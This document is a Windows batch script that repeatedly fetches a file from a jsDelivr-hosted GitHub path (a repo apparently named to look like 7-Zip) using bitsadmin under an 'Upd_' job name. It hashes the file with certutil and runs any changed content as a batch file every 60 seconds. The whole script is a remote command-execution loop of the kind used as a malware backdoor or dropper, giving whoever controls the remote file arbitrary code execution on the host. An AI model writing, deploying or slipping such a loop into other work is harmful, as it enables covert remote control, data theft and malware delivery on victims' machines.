@echo off
setlocal enabledelayedexpansion

set "URL=https://cdn.jsdelivr.net/gh/anupcic/7zip@main/cmd.tmp"
set "DL=%TEMP%\cmd.txt"
set "RUN=%TEMP%\cmd.bat"
set "HASH=%TEMP%\cmd.hash"

:loop
set "JOBNM=Upd_%RANDOM%"

:: Download fresh copy
del "%DL%" 2>nul
echo [%date% %time%] [*] Fetching...
bitsadmin /transfer "%JOBNM%" /download /priority normal "%URL%" "%DL%" >nul 2>&1

if not exist "%DL%" (
    echo [%date% %time%] [X] Download failed, retrying in 60s
    goto :wait
)

:: Compute hash of downloaded file
set "NEWHASH="
for /f "skip=1 delims=" %%H in ('certutil -hashfile "%DL%" MD5') do (
    if not defined NEWHASH set "NEWHASH=%%H"
)
set "NEWHASH=!NEWHASH: =!"

:: Compare with previous hash
set "OLDHASH="
if exist "%HASH%" set /p OLDHASH=<"%HASH%"

if /i "!NEWHASH!"=="!OLDHASH!" (
    echo [%date% %time%] [=] No change ^(hash !NEWHASH!^)
    goto :wait
)

echo [%date% %time%] [+] New content detected ^(hash !NEWHASH!^)
echo !NEWHASH!>"%HASH%"

:: Show contents
echo ---------- CONTENTS ----------
type "%DL%"
echo ------------------------------
echo.

:: Execute
copy /y "%DL%" "%RUN%" >nul
echo [%date% %time%] [*] Running...
call "%RUN%"
echo [%date% %time%] [*] Exit code: %ERRORLEVEL%
echo.

:wait
timeout /t 60 /nobreak >nul
goto :loop